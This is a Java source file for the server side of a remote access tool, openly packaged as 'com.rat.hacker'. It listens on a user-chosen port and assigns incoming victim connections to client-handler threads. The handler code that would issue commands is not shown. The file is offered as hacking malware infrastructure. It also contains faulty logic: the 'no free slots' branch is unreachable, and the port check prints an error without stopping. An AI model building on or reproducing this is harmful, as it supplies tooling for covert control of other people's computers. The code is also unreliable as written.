package com.rat.hacker;

/**
 * @author Bar771
 * https://Bar771.tumblr.com
 */

import java.net.Socket;
import java.net.ServerSocket;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;

import java.util.Scanner;

import java.io.IOException;

public class Rat {
	
	private boolean isRunning = true;
	private int port = 1000;
	private Client[] clients = new Client[10];
	
	public Rat() {
		Scanner scan = new Scanner(System.in);
		System.out.println("Type in some port:");
		this.port = scan.nextInt();
		try {
			createConnection(this.port);
		} catch (Exception e) {
			e.printStackTrace(); 
		}
	}
	
	public static void main(String[] args) {
		Rat r = new Rat();
	}
	
	/*
	 * Create socket listener.
	 * @param port
	 */
	private void createConnection(int port) throws IOException {
		if (port < 1000 || port >= 1999) System.err.println("Invalid port.");
		ServerSocket server = new ServerSocket(port);
		System.out.println("[RAT] Server has started !");
		
		//
		while (isRunning) {
			System.out.println("[RAT] Waiting connection ..");
			Socket socket = server.accept();
			System.out.println("[RAT] New client has connected.");
			BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			PrintWriter out = new PrintWriter(socket.getOutputStream());
			
			for (int i=0; i<clients.length; i++) {
				if (clients[i] == null) {
					Client c = new Client(this, i, in, out, socket);
					c.start();
					setClient(i, c);
					break;
				}
				else if (i == clients.length) {
					System.err.println("[" + i + "] There're no free slots.");
					out.println("There're no free slots.");
					out.flush();
					socket.close();
					break;
				}
			}
		}
		//
	}
	
	/*
	 * @param i
	 */
	public Client getClient(int i) {
		return clients[i];
	}
	
	/*
	 * @param i
	 * @param c
	 */
	public void setClient(int i, Client c) {
		clients[i] = c;
	}
	
}
